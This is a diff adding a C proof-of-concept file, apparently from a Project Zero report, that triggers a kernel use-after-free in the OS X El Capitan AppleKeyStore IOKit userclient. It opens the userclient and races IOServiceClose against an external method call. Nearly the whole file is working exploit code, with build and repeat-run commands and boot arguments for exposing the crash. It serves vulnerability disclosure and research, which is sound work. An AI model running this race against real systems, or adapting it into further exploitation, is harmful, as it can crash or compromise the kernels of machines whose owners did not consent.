@@ -1,0 +1,144 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=710
+
+The AppleKeyStore userclient uses an IOCommandGate to serialize access to its userclient methods, however
+by racing two threads, one of which closes the userclient (which frees the IOCommandGate)
+and one of which tries to make an external method call we can cause a use-after-free of the IOCommandGate.
+
+Tested on OS X 10.11.3 El Capitan 15D21 on MacBookAir5,2
+*/
+
+//ianbeer
+
+//build: clang -o applekeystore_race applekeystore_race.c -framework IOKit -lpthread
+//repro: while true; do ./applekeystore_race; done
+// try adding -zc -zp gzalloc_min=80 gzalloc_max=120 to your boot args to crash on the use after free
+
+/*
+OS X Kernel use-after-free in AppleKeyStore
+
+The AppleKeyStore userclient uses an IOCommandGate to serialize access to its userclient methods, however
+by racing two threads, one of which closes the userclient (which frees the IOCommandGate)
+and one of which tries to make an external method call we can cause a use-after-free of the IOCommandGate.
+
+Tested on OS X 10.11.3 El Capitan 15D21 on MacBookAir5,2
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#include <IOKit/IOKitLib.h>
+
+#include <libkern/OSAtomic.h>
+
+#include <mach/thread_act.h>
+
+#include <pthread.h>
+
+#include <mach/mach.h>
+#include <mach/vm_map.h>
+#include <sys/mman.h>
+    
+unsigned int selector = 0;
+
+uint64_t inputScalar[16];
+size_t inputScalarCnt = 0;
+
+uint8_t inputStruct[40960];
+size_t inputStructCnt = 0; 
+
+uint64_t outputScalar[16] = {0};
+uint32_t outputScalarCnt = 0;
+
+char outputStruct[40960] = {0};
+size_t outputStructCnt = 0;
+
+io_connect_t global_conn = MACH_PORT_NULL;
+
+void set_params(io_connect_t conn){
+  global_conn = conn;
+  selector = 0;
+  inputScalarCnt = 4;
+  inputStructCnt = 0; 
+  outputScalarCnt = 16;
+  outputStructCnt = 40960;  
+}
+
+void make_iokit_call(){  
+  IOConnectCallMethod(
+      global_conn,
+      selector,
+      inputScalar,
+      inputScalarCnt,
+      inputStruct,
+      inputStructCnt,
+      outputScalar,
+      &outputScalarCnt,
+      outputStruct,
+      &outputStructCnt);
+}
+
+OSSpinLock lock = OS_SPINLOCK_INIT;
+
+void* thread_func(void* arg){
+  int got_it = 0;
+  while (!got_it) {
+    got_it = OSSpinLockTry(&lock);
+  }
+
+  make_iokit_call();
+  return NULL;
+}
+
+mach_port_t get_user_client(char* name, int type) {
+  kern_return_t err;
+
+  CFMutableDictionaryRef matching = IOServiceMatching(name);
+  if(!matching){
+   printf("unable to create service matching dictionary\n");
+   return 0;
+  }
+
+  io_iterator_t iterator;
+  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
+  if (err != KERN_SUCCESS){
+   printf("no matches\n");
+   return 0;
+  }
+
+  io_service_t service = IOIteratorNext(iterator);
+
+  if (service == IO_OBJECT_NULL){
+   printf("unable to find service\n");
+   return 0;
+  }
+  printf("got service: %x\n", service);
+
+
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), type, &conn);
+  if (err != KERN_SUCCESS){
+   printf("unable to get user client connection\n");
+   return 0;
+  }
+
+  printf("got userclient connection: %x\n", conn);
+
+  return conn;
+}
+
+int main(int argc, char** argv){
+  OSSpinLockLock(&lock);
+
+  pthread_t t;
+  pthread_create(&t, NULL, thread_func, NULL);
+
+  mach_port_t conn = get_user_client("AppleKeyStore", 0);
+  
+  set_params(conn);
+  OSSpinLockUnlock(&lock);
+  IOServiceClose(conn);
+  return 0;
+}
